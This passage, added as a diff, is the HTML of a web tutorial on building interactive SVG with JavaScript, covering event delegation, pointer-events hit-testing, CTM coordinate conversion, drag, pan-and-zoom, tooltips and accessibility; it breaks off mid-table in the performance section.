+        <img src="https://iconstash.io/assets/articles/how-to-create-interactive-svg-with-javascript-guide.jpg" alt="Technical diagram showing interactive SVG DOM programming, JavaScript event handling, and coordinate matrix transformations" width="1200" height="675">
+        <figcaption>Figure 1: Deep DOM scripting, event bubbling, and affine matrix coordinate transformations in interactive SVG engineering.</figcaption>
+      </figure>
+
+      <section id="interactiveSvgStudio">
+        <h2>Interactive SVG JavaScript Event Studio &amp; Coordinate Inspector</h2>
+        <p>Explore real-time SVG event handling, inspect screen-to-viewBox matrix conversions, switch pointer-events modes, drag interactive nodes, and generate production-ready JavaScript and TypeScript snippets.</p>
+
+        <div class="interactive-sandbox">
+          <div class="sandbox-header">
+            <div class="sandbox-title">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 15l5 5m-5-5a7 7 0 1 0-10-10 7 7 0 0 0 10 10Z"/><path d="M10 7v6m-3-3h6"/></svg>
+              <span>Interactive SVG Event Sandbox (#interactiveSvgStudio)</span>
+            </div>
+            <span class="sandbox-badge">Live Hardware-Accelerated Studio</span>
+          </div>
+
+          <div class="sandbox-grid">
+            <div class="sandbox-controls">
+              <div class="control-row">
+                <label>Active Interaction Mode</label>
+                <div class="preset-chips" id="studioModes">
+                  <button type="button" class="preset-chip active" data-mode="drag">Free Drag &amp; Drop</button>
+                  <button type="button" class="preset-chip" data-mode="click">Click &amp; Toggle</button>
+                  <button type="button" class="preset-chip" data-mode="inspect">Hover &amp; Inspect CTM</button>
+                </div>
+              </div>
+
+              <div class="control-row">
+                <label for="pointerEventsSelect">Pointer Events Hit-Testing Rule</label>
+                <select id="pointerEventsSelect" style="background:#181818; color:#EEE; border:1px solid #333; padding:8px 12px; border-radius:6px; font-family:'JetBrains Mono', monospace;">
+                  <option value="visiblePainted" selected>visiblePainted (Standard painted areas)</option>
+                  <option value="all">all (Fill, stroke &amp; invisible bounds)</option>
+                  <option value="none">none (Transparent pass-through)</option>
+                  <option value="fill">fill (Interior fill only, ignore stroke)</option>
+                  <option value="stroke">stroke (Outline stroke only, hollow center)</option>
+                </select>
+              </div>
+
+              <div class="control-row">
+                <label for="shapeSelect">Interactive Vector Geometry</label>
+                <select id="shapeSelect" style="background:#181818; color:#EEE; border:1px solid #333; padding:8px 12px; border-radius:6px; font-family:'JetBrains Mono', monospace;">
+                  <option value="allShapes" selected>Full Vector Scene (Rect, Circle, Star, Path)</option>
+                  <option value="badge">Interactive UI Badge Node</option>
+                  <option value="mapNode">Interactive Data Point Map Node</option>
+                </select>
+              </div>
+
+              <div class="control-row">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+                  <label style="margin:0;">Real-Time DOM Event Logger</label>
+                  <button type="button" id="clearLogBtn" style="background:transparent; border:1px solid #333; color:#888; font-size:11px; padding:2px 8px; border-radius:4px; cursor:pointer;">Clear Log</button>
+                </div>
+                <div class="event-log-container" id="eventLogArea">
+                  <div class="log-line"><span class="log-time">[Init]</span> <span class="log-type">System</span>: Studio ready. Click or drag SVG nodes.</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="stage-wrapper">
+              <div class="preview-stage-container">
+                <div class="stage-viewport-box" id="stageViewportBox">
+                  <svg id="stageSvg" class="stage-svg-element" viewBox="0 0 500 320" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                      <linearGradient id="studioNodeGrad" x1="0" y1="0" x2="1" y2="1">
+                        <stop offset="0%" stop-color="#C1DD2D"/>
+                        <stop offset="100%" stop-color="#60A5FA"/>
+                      </linearGradient>
+                      <filter id="studioGlow" x="-20%" y="-20%" width="140%" height="140%">
+                        <feDropShadow dx="0" dy="2" stdDeviation="4" flood-color="#C1DD2D" flood-opacity="0.45"/>
+                      </filter>
+                    </defs>
+
+                    <!-- Background Grid -->
+                    <g stroke="rgba(255,255,255,0.05)" stroke-width="1" pointer-events="none">
+                      <line x1="50" y1="0" x2="50" y2="320"/>
+                      <line x1="100" y1="0" x2="100" y2="320"/>
+                      <line x1="150" y1="0" x2="150" y2="320"/>
+                      <line x1="200" y1="0" x2="200" y2="320"/>
+                      <line x1="250" y1="0" x2="250" y2="320"/>
+                      <line x1="300" y1="0" x2="300" y2="320"/>
+                      <line x1="350" y1="0" x2="350" y2="320"/>
+                      <line x1="400" y1="0" x2="400" y2="320"/>
+                      <line x1="450" y1="0" x2="450" y2="320"/>
+                      <line x1="0" y1="50" x2="500" y2="50"/>
+                      <line x1="0" y1="100" x2="500" y2="100"/>
+                      <line x1="0" y1="150" x2="500" y2="150"/>
+                      <line x1="0" y1="200" x2="500" y2="200"/>
+                      <line x1="0" y1="250" x2="500" y2="250"/>
+                      <line x1="0" y1="300" x2="500" y2="300"/>
+                    </g>
+
+                    <!-- Interactive Group 1: Draggable Node -->
+                    <g id="demoDraggable" transform="translate(110, 140)" cursor="grab" role="button" tabindex="0" aria-label="Draggable vector hexagon component">
+                      <polygon id="dragShape" points="0,-45 39,-22 39,22 0,45 -39,22 -39,-22" fill="#181E07" stroke="#C1DD2D" stroke-width="3" filter="url(#studioGlow)"/>
+                      <circle cx="0" cy="0" r="14" fill="#C1DD2D"/>
+                      <text x="0" y="4" text-anchor="middle" font-family="'JetBrains Mono', monospace" font-size="11" font-weight="700" fill="#0A0A0A" pointer-events="none">DRAG</text>
+                    </g>
+
+                    <!-- Interactive Group 2: Clickable Card -->
+                    <g id="demoClickTarget" transform="translate(290, 80)" cursor="pointer" role="button" tabindex="0" aria-label="Clickable interactive card target">
+                      <rect id="clickShape" width="160" height="90" rx="8" fill="#141414" stroke="#333" stroke-width="2"/>
+                      <circle cx="28" cy="28" r="10" fill="#3B82F6"/>
+                      <text x="48" y="32" font-family="'Inter', sans-serif" font-size="13" font-weight="700" fill="#FFF">Metric Node</text>
+                      <text id="clickCountLabel" x="48" y="52" font-family="'JetBrains Mono', monospace" font-size="11" fill="#888">Clicks: 0</text>
+                      <text x="48" y="70" font-family="'JetBrains Mono', monospace" font-size="10" fill="#C1DD2D">Status: Active</text>
+                    </g>
+
+                    <!-- Interactive Shape 3: Geometric Star -->
+                    <g id="demoStar" transform="translate(360, 240)" cursor="pointer" role="button" tabindex="0" aria-label="Interactive pulse star">
+                      <polygon id="starShape" points="0,-30 9,-9 30,-9 13,4 19,25 0,12 -19,25 -13,4 -30,-9 -9,-9" fill="rgba(96,165,250,0.15)" stroke="#60A5FA" stroke-width="2"/>
+                      <text x="0" y="38" text-anchor="middle" font-family="'JetBrains Mono', monospace" font-size="10" fill="#888">HOVER</text>
+                    </g>
+
+                    <!-- Cursor Tracking Point -->
+                    <circle id="trackPoint" cx="-100" cy="-100" r="5" fill="#EF4444" pointer-events="none"/>
+                  </svg>
+                  <div class="viewport-meta-overlay" id="viewportMetaOverlay">viewBox: 0 0 500 320</div>
+                </div>
+              </div>
+
+              <div class="stroke-stats-box">
+                <div class="stat-item">
+                  <div class="stat-label">Client Viewport (px)</div>
+                  <div class="stat-val" id="clientCoordsVal">X: 0, Y: 0</div>
+                </div>
+                <div class="stat-item">
+                  <div class="stat-label">SVG viewBox Space</div>
+                  <div class="stat-val highlight" id="svgCoordsVal">X: 0.0, Y: 0.0</div>
+                </div>
+                <div class="stat-item">
+                  <div class="stat-label">Matrix Scale CTM</div>
+                  <div class="stat-val" id="ctmScaleVal">1.000 × 1.000</div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="generated-code-box">
+            <div class="code-box-head">
+              <div class="code-tabs">
+                <button type="button" class="code-tab-btn active" data-tab="vanilla">Vanilla JS (ES6+)</button>
+                <button type="button" class="code-tab-btn" data-tab="ts">TypeScript Class</button>
+                <button type="button" class="code-tab-btn" data-tab="react">React Pointer Hook</button>
+              </div>
+              <div class="code-actions">
+                <button type="button" class="copy-btn" id="copyInteractiveCodeBtn">Copy Snippet</button>
+              </div>
+            </div>
+            <pre class="code-output-area" id="interactiveCodeOutput">// Production JavaScript Event Handler</pre>
+          </div>
+        </div>
+      </section>
+
+      <section id="svg-dom-architecture">
+        <h2>1. The Dual Architecture of SVG: Vector Graphics Engine vs. Live DOM Node Hierarchy</h2>
+        <p>In classical web development, engineers often group digital graphic assets under the monolithic umbrella of "media." Bitmaps such as JPEG, WebP, and PNG deliver pre-rasterized 2D arrays of colored pixels. When an image file is rendered into an HTML document via an <code>&lt;img&gt;</code> element, the browser engine allocates a GPU texture backing store and hands rendering off to the compositor. The interior of the graphic is completely opaque to JavaScript execution, CSS stylesheets, and accessibility trees.</p>
+
+        <p>Scalable Vector Graphics (SVG), by formal W3C specification, is structurally different. An SVG document is an XML-based hierarchical Document Object Model tree consisting of structured geometry primitives (such as <code>&lt;path&gt;</code>, <code>&lt;circle&gt;</code>, <code>&lt;rect&gt;</code>, <code>&lt;polygon&gt;</code>, and <code>&lt;g&gt;</code>). When embedded inline within an HTML5 document, every vector element inherits from the standard <code>SVGElement</code> interface, which in turn extends the foundational <code>Element</code> and <code>EventTarget</code> interfaces of the web platform.</p>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Feature / Capability</th>
+                <th>Inline SVG DOM</th>
+                <th>HTML5 Canvas 2D</th>
+                <th>WebGL / WebGPU</th>
+                <th>External &lt;img src="icon.svg"&gt;</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>DOM Node Per Primitive</strong></td>
+                <td>Yes (First-class elements)</td>
+                <td>No (Immediate mode pixels)</td>
+                <td>No (Raw vertex buffers)</td>
+                <td>No (Isolated raster plane)</td>
+              </tr>
+              <tr>
+                <td><strong>Native Event Listeners</strong></td>
+                <td><code>addEventListener()</code> on any node</td>
+                <td>Manual raycasting / math</td>
+                <td>Manual 3D raycasting</td>
+                <td>None (Read-only container)</td>
+              </tr>
+              <tr>
+                <td><strong>CSS Styling &amp; Hover States</strong></td>
+                <td>Full CSS3 &amp; Transitions support</td>
+                <td>Custom render loops</td>
+                <td>Custom GLSL shaders</td>
+                <td>Static (Host CSS blocked)</td>
+              </tr>
+              <tr>
+                <td><strong>Accessibility Tree (AOM)</strong></td>
+                <td>Full ARIA, roles &amp; keyboard focus</td>
+                <td>Manual Fallback Canvas DOM</td>
+                <td>Manual accessibility trees</td>
+                <td>Only container alt text</td>
+              </tr>
+              <tr>
+                <td><strong>Subpixel Vector Scaling</strong></td>
+                <td>Infinite mathematical crispness</td>
+                <td>Pixelated unless up-buffered</td>
+                <td>Resolution-dependent meshes</td>
+                <td>Infinite mathematical crispness</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Because every SVG child node is an <code>EventTarget</code>, developers can bind event listeners directly to individual vector subcomponents. You can highlight a geographical territory on an interactive choropleth map, trigger dynamic tooltip flyouts on real-time telemetry charts, or build fluid drag-and-drop workflow diagramming canvases without importing heavyweight third-party rendering engines.</p>
+      </section>
+
+      <section id="event-model-propagation">
+        <h2>2. The SVG Event Lifecycle: Capturing, Bubbling, and Event Delegation</h2>
+        <p>Interactive SVGs operate under the universal W3C DOM Level 3 Event dispatch mechanism. When a user clicks, hovers, or taps a vector graphic, the event passes through three distinct phases across the SVG DOM hierarchy:</p>
+
+        <ol>
+          <li><strong>The Capture Phase:</strong> The browser travels downward from the <code>Window</code>, through the HTML document, down through the root <code>&lt;svg&gt;</code> element, and through nested <code>&lt;g&gt;</code> groups until it reaches the deepest target node.</li>
+          <li><strong>The Target Phase:</strong> The event triggers on the specific geometry node directly beneath the pointer (such as a <code>&lt;path&gt;</code> representing an icon arrow or a <code>&lt;circle&gt;</code> representing a data point).</li>
+          <li><strong>The Bubbling Phase:</strong> The event bubbles back upward through its parent vector containers, triggering any listeners attached to parent groups or the top-level SVG canvas before reaching the HTML document body.</li>
+        </ol>
+
+        <p>Understanding event bubbling is essential when engineering high-performance vector visualizations. If you are building a complex data dashboard with 5,000 interactive scatter plot points, attaching individual event listeners to each <code>&lt;circle&gt;</code> creates substantial memory bloat and garbage collection pressure. Instead, leverage <strong>Event Delegation</strong> by mounting a single listener on the parent <code>&lt;svg&gt;</code> container:</p>
+
+        <pre><code class="language-javascript">// High-performance SVG Event Delegation pattern
+const svgCanvas = document.getElementById('analyticsChart');
+
+svgCanvas.addEventListener('pointerdown', (event) => {
+  // Identify the closest interactive vector target
+  const interactiveNode = event.target.closest('[data-interactive="true"]');
+  if (!interactiveNode) return;
+
+  const nodeId = interactiveNode.getAttribute('data-id');
+  const nodeType = interactiveNode.tagName.toLowerCase();
+
+  console.log(`User engaged with ${nodeType} ID: ${nodeId}`);
+  interactiveNode.classList.add('node-active');
+});</code></pre>
+
+        <div class="takeaway-box">
+          <h3>Architectural Rule: Target vs. CurrentTarget in Grouped Assets</h3>
+          <p>When an interactive icon or component consists of multiple nested shapes wrapped in a <code>&lt;g id="actionButton"&gt;</code>, clicking the icon will set <code>event.target</code> to the specific child <code>&lt;path&gt;</code> or <code>&lt;rect&gt;</code> that was clicked, whereas <code>event.currentTarget</code> refers to the element to which the event listener was attached. Always use <code>event.target.closest('g.action-button')</code> or reference <code>event.currentTarget</code> to avoid broken state when users click inner sub-paths.</p>
+        </div>
+      </section>
+
+      <section id="pointer-events-hierarchy">
+        <h2>3. Mastering the SVG pointer-events Property Hierarchy</h2>
+        <p>In standard HTML CSS, the <code>pointer-events</code> property is primarily a binary toggle between <code>auto</code> and <code>none</code>. In Scalable Vector Graphics, however, the SVG specification defines 8 specialized values designed specifically for 2D coordinate hit-testing. Understanding these distinctions prevents the common bug where thin outlines are impossible to click or transparent backgrounds intercept clicks meant for elements underneath:</p>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>Property Value</th>
+                <th>Hit-Tests Fill</th>
+                <th>Hit-Tests Stroke</th>
+                <th>Requires Painted Value</th>
+                <th>Requires visibility: visible</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>visiblePainted</code> (Default)</td>
+                <td>Yes</td>
+                <td>Yes</td>
+                <td>Yes (Fill/Stroke ≠ none)</td>
+                <td>Yes</td>
+              </tr>
+              <tr>
+                <td><code>visibleFill</code></td>
+                <td>Yes</td>
+                <td>No</td>
+                <td>Yes (Fill ≠ none)</td>
+                <td>Yes</td>
+              </tr>
+              <tr>
+                <td><code>visibleStroke</code></td>
+                <td>No</td>
+                <td>Yes</td>
+                <td>Yes (Stroke ≠ none)</td>
+                <td>Yes</td>
+              </tr>
+              <tr>
+                <td><code>visible</code></td>
+                <td>Yes</td>
+                <td>Yes</td>
+                <td>No (Hits even if fill/stroke="none")</td>
+                <td>Yes</td>
+              </tr>
+              <tr>
+                <td><code>painted</code></td>
+                <td>Yes</td>
+                <td>Yes</td>
+                <td>Yes (Fill/Stroke ≠ none)</td>
+                <td>No (Hits even if hidden)</td>
+              </tr>
+              <tr>
+                <td><code>fill</code></td>
+                <td>Yes</td>
+                <td>No</td>
+                <td>No (Hits even if fill="none")</td>
+                <td>No</td>
+              </tr>
+              <tr>
+                <td><code>stroke</code></td>
+                <td>No</td>
+                <td>Yes</td>
+                <td>No (Hits even if stroke="none")</td>
+                <td>No</td>
+              </tr>
+              <tr>
+                <td><code>all</code></td>
+                <td>Yes</td>
+                <td>Yes</td>
+                <td>No (Hits regardless of paint)</td>
+                <td>No</td>
+              </tr>
+              <tr>
+                <td><code>none</code></td>
+                <td>No</td>
+                <td>No</td>
+                <td>Never (Passes events through)</td>
+                <td>Never</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <p>Consider a practical engineering challenge: you have an outline icon with a <code>stroke-width="1.5"</code> and <code>fill="none"</code>. Under default <code>visiblePainted</code> rules, the user must land their mouse pointer precisely on the 1.5-pixel line. Clicking in the center of the shape does nothing, creating severe UX friction. Setting <code>pointer-events: all;</code> on the icon path forces the browser to register clicks across the entire enclosed interior boundary even though the fill is completely transparent.</p>
+      </section>
+
+      <section id="coordinate-transforms-ctm">
+        <h2>4. The Coordinate Transformation Problem: Converting Screen Pixels to SVG viewBox Units</h2>
+        <p>The single greatest hurdle developers encounter when building interactive SVG applications is the coordinate transformation barrier. A standard pointer event yields screen-space properties:</p>
+
+        <ul>
+          <li><code>event.clientX</code> / <code>clientY</code>: Coordinates in CSS pixels relative to the browser viewport window.</li>
+          <li><code>event.pageX</code> / <code>pageY</code>: Coordinates in CSS pixels relative to the entire scrollable HTML document.</li>
+          <li><code>event.offsetX</code> / <code>offsetY</code>: Coordinates in CSS pixels relative to the bounding box of the padding edge of the target node.</li>
+        </ul>
+
+        <p>None of these values can be applied directly to SVG attributes such as <code>cx</code>, <code>cy</code>, or path coordinates. An SVG element exists in its own abstract coordinate space defined by its <code>viewBox="minX minY width height"</code> and <code>preserveAspectRatio</code> settings. If an SVG has a <code>viewBox="0 0 1000 1000"</code> but CSS renders it at <code>300px × 300px</code>, one screen pixel represents <code>3.333</code> SVG user units.</p>
+
+        <div class="formula-card">
+          <div class="formula-title">Mathematical Coordinate Space Mapping Equation</div>
+          <div class="formula-body">P_svg = (P_screen - Translation_matrix) × Inverse_CTM</div>
+          <div class="formula-desc">Where P_screen is the homogeneous point [clientX, clientY, 1]^T and Inverse_CTM is the inverse of the Current Transformation Matrix [a c e; b d f; 0 0 1] obtained from svg.getScreenCTM().inverse().</div>
+        </div>
+
+        <p>To accurately convert pointer coordinates into SVG user space under any zoom, scroll, responsive resize, or aspect-ratio scale, you must query the element's <strong>Current Transformation Matrix (CTM)</strong> via <code>getScreenCTM()</code> and apply its mathematical inverse:</p>
+
+        <pre><code class="language-javascript">/**
+ * Accurately transforms screen client coordinates to SVG user space.
+ * Compatible with all modern evergreen browsers (Chrome, Firefox, Safari, Edge).
+ *
+ * @param {SVGSVGElement} svg - The root or container SVG element
+ * @param {number} clientX - MouseEvent or PointerEvent clientX
+ * @param {number} clientY - MouseEvent or PointerEvent clientY
+ * @returns {{x: number, y: number}} The exact coordinates in SVG viewBox units
+ */
+function getSvgCoordinates(svg, clientX, clientY) {
+  // Obtain the 2D affine Current Transformation Matrix from SVG to viewport
+  const ctm = svg.getScreenCTM();
+  if (!ctm) {
+    return { x: 0, y: 0 };
+  }
+
+  // Modern W3C Geometry Interfaces: DOMPoint
+  if (window.DOMPoint) {
+    const point = new DOMPoint(clientX, clientY);
+    const transformedPoint = point.matrixTransform(ctm.inverse());
+    return { x: transformedPoint.x, y: transformedPoint.y };
+  }
+
+  // Fallback for legacy SVG1.1 implementations
+  const legacyPoint = svg.createSVGPoint();
+  legacyPoint.x = clientX;
+  legacyPoint.y = clientY;
+  const transformedLegacy = legacyPoint.matrixTransform(ctm.inverse());
+  return { x: transformedLegacy.x, y: transformedLegacy.y };
+}</code></pre>
+      </section>
+
+      <section id="drag-and-drop-implementation">
+        <h2>5. Engineering Resilient Drag-and-Drop in Scalable Vector Space</h2>
+        <p>Implementing drag-and-drop interactions inside an SVG requires managing pointer state transitions, calculating positional offsets to prevent the shape from snapping its center to the cursor, and capturing pointer movement outside the graphic boundaries.</p>
+
+        <h3>Step 1: Managing Drag State</h3>
+        <p>Store an initial offset vector equal to the distance between the pointer's landing coordinate and the shape's anchor position. This ensures the dragged shape maintains its exact relative grip point during movement.</p>
+
+        <h3>Step 2: Utilizing setPointerCapture</h3>
+        <p>Traditional mouse event systems suffered from "cursor escape": if the user moved the mouse faster than the browser could repaint, the cursor drifted off the shape, breaking the drag sequence. Modern <strong>Pointer Events</strong> provide <code>setPointerCapture(pointerId)</code>, guaranteeing that all subsequent move and release events route directly to the active node regardless of pointer location.</p>
+
+        <pre><code class="language-javascript">class DraggableSvgItem {
+  constructor(element, svgContainer) {
+    this.el = element;
+    this.svg = svgContainer;
+    this.isDragging = false;
+    this.offset = { x: 0, y: 0 };
+    this.currentPos = { x: 0, y: 0 };
+
+    this.init();
+  }
+
+  init() {
+    this.el.addEventListener('pointerdown', this.onPointerDown.bind(this));
+    this.el.addEventListener('pointermove', this.onPointerMove.bind(this));
+    this.el.addEventListener('pointerup', this.onPointerUp.bind(this));
+    this.el.addEventListener('pointercancel', this.onPointerUp.bind(this));
+  }
+
+  onPointerDown(e) {
+    // Only engage primary mouse button (left-click) or touch
+    if (e.button !== 0) return;
+
+    this.isDragging = true;
+    this.el.setPointerCapture(e.pointerId);
+
+    // Get current SVG pointer position
+    const pt = getSvgCoordinates(this.svg, e.clientX, e.clientY);
+
+    // Extract current transform translations
+    this.offset.x = pt.x - this.currentPos.x;
+    this.offset.y = pt.y - this.currentPos.y;
+
+    this.el.style.cursor = 'grabbing';
+    this.el.setAttribute('data-dragging', 'true');
+  }
+
+  onPointerMove(e) {
+    if (!this.isDragging) return;
+
+    const pt = getSvgCoordinates(this.svg, e.clientX, e.clientY);
+    this.currentPos.x = pt.x - this.offset.x;
+    this.currentPos.y = pt.y - this.offset.y;
+
+    // Apply hardware-accelerated SVG transform attribute
+    this.el.setAttribute(
+      'transform',
+      `translate(${this.currentPos.x.toFixed(2)}, ${this.currentPos.y.toFixed(2)})`
+    );
+  }
+
+  onPointerUp(e) {
+    if (!this.isDragging) return;
+    this.isDragging = false;
+    this.el.releasePointerCapture(e.pointerId);
+    this.el.style.cursor = 'grab';
+    this.el.removeAttribute('data-dragging');
+  }
+}</code></pre>
+      </section>
+
+      <section id="pan-and-zoom-controls">
+        <h2>6. Building Responsive Pan-and-Zoom Viewport Controls</h2>
+        <p>Interactive vector charts, schematic blueprints, and geographical maps frequently require canvas panning and continuous zooming. In raster graphics, zooming causes pixel interpolation artifacts. In SVG, panning and zooming are achieved with zero image degradation simply by dynamically recalculating the 4 values of the root <code>viewBox="minX minY width height"</code> attribute.</p>
+
+        <p>To implement zoom-to-cursor behavior (where zooming in centers mathematically around the user's current cursor position rather than the top-left origin):</p>
+
+        <pre><code class="language-javascript">class SvgPanZoom {
+  constructor(svgElement) {
+    this.svg = svgElement;
+    // Initial viewBox parameters
+    this.view = { x: 0, y: 0, w: 1000, h: 600 };
+    this.isPanning = false;
+    this.startPoint = { x: 0, y: 0 };
+
+    this.bindEvents();
+    this.updateViewBox();
+  }
+
+  bindEvents() {
+    this.svg.addEventListener('wheel', this.onWheel.bind(this), { passive: false });
+    this.svg.addEventListener('pointerdown', this.onPanStart.bind(this));
+    this.svg.addEventListener('pointermove', this.onPanMove.bind(this));
+    this.svg.addEventListener('pointerup', this.onPanEnd.bind(this));
+    this.svg.addEventListener('pointerleave', this.onPanEnd.bind(this));
+  }
+
+  onWheel(e) {
+    e.preventDefault(); // Prevent full web page scrolling
+
+    // Determine zoom scale factor
+    const zoomFactor = e.deltaY &lt; 0 ? 0.9 : 1.1;
+
+    // Calculate cursor location in current SVG coordinates before zoom
+    const mouseSvg = getSvgCoordinates(this.svg, e.clientX, e.clientY);
+
+    // Constrain minimum and maximum zoom ranges
+    const newWidth = Math.max(100, Math.min(5000, this.view.w * zoomFactor));
+    const newHeight = Math.max(60, Math.min(3000, this.view.h * zoomFactor));
+
+    // Shift origin so the point under the cursor remains stationary
+    this.view.x = mouseSvg.x - (mouseSvg.x - this.view.x) * (newWidth / this.view.w);
+    this.view.y = mouseSvg.y - (mouseSvg.y - this.view.y) * (newHeight / this.view.h);
+    this.view.w = newWidth;
+    this.view.h = newHeight;
+
+    this.updateViewBox();
+  }
+
+  onPanStart(e) {
+    // Only pan on middle-mouse click or right-click or if spacebar is held
+    if (e.button === 1 || e.buttons === 4 || e.shiftKey) {
+      this.isPanning = true;
+      this.startPoint = { x: e.clientX, y: e.clientY };
+      this.svg.style.cursor = 'move';
+    }
+  }
+
+  onPanMove(e) {
+    if (!this.isPanning) return;
+
+    const dxScreen = e.clientX - this.startPoint.x;
+    const dyScreen = e.clientY - this.startPoint.y;
+
+    // Convert screen pixel delta to SVG scale delta
+    const scaleX = this.view.w / this.svg.clientWidth;
+    const scaleY = this.view.h / this.svg.clientHeight;
+
+    this.view.x -= dxScreen * scaleX;
+    this.view.y -= dyScreen * scaleY;
+
+    this.startPoint = { x: e.clientX, y: e.clientY };
+    this.updateViewBox();
+  }
+
+  onPanEnd() {
+    this.isPanning = false;
+    this.svg.style.cursor = 'default';
+  }
+
+  updateViewBox() {
+    this.svg.setAttribute(
+      'viewBox',
+      `${this.view.x.toFixed(2)} ${this.view.y.toFixed(2)} ${this.view.w.toFixed(2)} ${this.view.h.toFixed(2)}`
+    );
+  }
+}</code></pre>
+      </section>
+
+      <section id="dynamic-tooltips-boundaries">
+        <h2>7. Dynamic Tooltip Positioning and Boundary Collision Detection</h2>
+        <p>A frequent design requirement in data visualizations and interactive vector maps is rendering rich contextual tooltips on hover or tap. Engineers face two primary implementation architectures:</p>
+
+        <ol>
+          <li><strong>Internal SVG Tooltips:</strong> Rendering an SVG <code>&lt;g&gt;</code> containing a <code>&lt;rect&gt;</code> and <code>&lt;text&gt;</code> elements directly within the vector DOM. While this keeps all assets inside the vector scene, SVG tooltips are bounded by the SVG viewport and cannot overflow outside the graphic. Furthermore, multi-line auto-wrapping text in SVG 1.1 requires complex manual calculation.</li>
+          <li><strong>External HTML Floating Overlays:</strong> Rendering a standard absolute/fixed HTML <code>&lt;div class="tooltip"&gt;</code> positioned over the document. This approach supports standard CSS styling, rounded corners, box-shadows, and natural text wrapping.</li>
+        </ol>
+
+        <p>When using an external HTML tooltip, calculate the anchor element's screen coordinates via <code>element.getBoundingClientRect()</code>:</p>
+
+        <pre><code class="language-javascript">function attachSvgTooltip(svgElement, tooltipNode) {
+  svgElement.addEventListener('pointerover', (e) => {
+    const target = e.target.closest('[data-tooltip]');
+    if (!target) return;
+
+    const text = target.getAttribute('data-tooltip');
+    tooltipNode.textContent = text;
+    tooltipNode.style.display = 'block';
+
+    const rect = target.getBoundingClientRect();
+    const tooltipRect = tooltipNode.getBoundingClientRect();
+
+    // Position centered above the vector shape
+    let top = rect.top - tooltipRect.height - 8;
+    let left = rect.left + (rect.width / 2) - (tooltipRect.width / 2);
+
+    // Collision check: clamp to window boundaries
+    if (top &lt; 0) top = rect.bottom + 8;
+    if (left &lt; 8) left = 8;
+    if (left + tooltipRect.width &gt; window.innerWidth - 8) {
+      left = window.innerWidth - tooltipRect.width - 8;
+    }
+
+    tooltipNode.style.transform = `translate3d(${left}px, ${top}px, 0)`;
+    tooltipNode.classList.add('tooltip-visible');
+  });
+
+  svgElement.addEventListener('pointerout', (e) => {
+    const target = e.target.closest('[data-tooltip]');
+    if (!target) return;
+    tooltipNode.classList.remove('tooltip-visible');
+  });
+}</code></pre>
+      </section>
+
+      <section id="accessibility-keyboard-aria">
+        <h2>8. Accessible Interactive SVG: Keyboard Navigation, ARIA Semantics &amp; Focus Management</h2>
+        <p>An interactive vector element that responds only to mouse clicks violates WCAG 2.2 Level AA accessibility guidelines. Screen reader users and individuals utilizing keyboard navigation, switch devices, or braille displays must be able to discover, focus, and activate every interactive control inside your SVG.</p>
+
+        <h3>Essential Accessibility Checklist for Interactive SVG</h3>
+        <ul>
+          <li><strong>Keyboard Focusability:</strong> Plain SVG shapes are not focusable by default. You must declare <code>tabindex="0"</code> on interactive elements or groups.</li>
+          <li><strong>Semantic Roles:</strong> Assign appropriate ARIA roles such as <code>role="button"</code>, <code>role="link"</code>, or <code>role="slider"</code> so assistive software announces the element's purpose.</li>
+          <li><strong>Accessible Names:</strong> Supply clear descriptions using <code>aria-label</code> or link an internal <code>&lt;title id="titleId"&gt;</code> via <code>aria-labelledby="titleId"</code>.</li>
+          <li><strong>Keyboard Triggers:</strong> In addition to pointer handlers, bind <code>keydown</code> listeners for both the <kbd>Enter</kbd> (code 13) and <kbd>Space</kbd> (code 32) keys.</li>
+          <li><strong>Visible Focus Indicators:</strong> Use the CSS <code>:focus-visible</code> pseudo-class to render high-contrast focus rings around active SVG nodes.</li>
+        </ul>
+
+        <pre><code class="language-html">&lt;!-- WCAG 2.2 AA Compliant Accessible Interactive SVG Component --&gt;
+&lt;svg viewBox="0 0 200 100" width="200" height="100" role="region" aria-label="Interactive Controls"&gt;
+  &lt;g id="muteButton"
+     role="button"
+     tabindex="0"
+     aria-label="Toggle Audio Mute"
+     aria-pressed="false"
+     class="accessible-svg-btn"&gt;
+    &lt;rect x="10" y="20" width="180" height="60" rx="8" class="btn-bg"/&gt;
+    &lt;text x="100" y="55" text-anchor="middle" class="btn-text"&gt;Mute Sound&lt;/text&gt;
+  &lt;/g&gt;
+&lt;/svg&gt;
+
+&lt;style&gt;
+  .accessible-svg-btn { cursor: pointer; outline: none; }
+  .accessible-svg-btn .btn-bg { fill: #1E293B; stroke: #334155; stroke-width: 2; transition: all 150ms ease; }
+  .accessible-svg-btn:hover .btn-bg { fill: #334155; stroke: #C1DD2D; }
+  /* Crisp, high-visibility keyboard focus outline */
+  .accessible-svg-btn:focus-visible .btn-bg {
+    stroke: #C1DD2D;
+    stroke-width: 3;
+    stroke-dasharray: 4 2;
+  }
+&lt;/style&gt;
+
+&lt;script&gt;
+  const btn = document.getElementById('muteButton');
+  function toggleMute() {
+    const isPressed = btn.getAttribute('aria-pressed') === 'true';
+    btn.setAttribute('aria-pressed', String(!isPressed));
+    console.log(`Audio muted state: ${!isPressed}`);
+  }
+
+  btn.addEventListener('click', toggleMute);
+  btn.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' || e.key === ' ') {
+      e.preventDefault(); // Prevent page scroll on Space
+      toggleMute();
+    }
+  });
+&lt;/script&gt;</code></pre>
+      </section>
+
+      <section id="performance-optimization">
+        <h2>9. Performance Optimization: Hardware Acceleration, Passive Listeners &amp; Paint Thrashing</h2>
+        <p>While modern browser engines execute JavaScript at near-native speeds, interacting with hundreds of vector nodes can introduce severe paint bottlenecks if not architected conscientiously. The browser must re-tessellate vector paths into triangle meshes and rasterize them into GPU framebuffers whenever geometric coordinates change.</p>
+
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
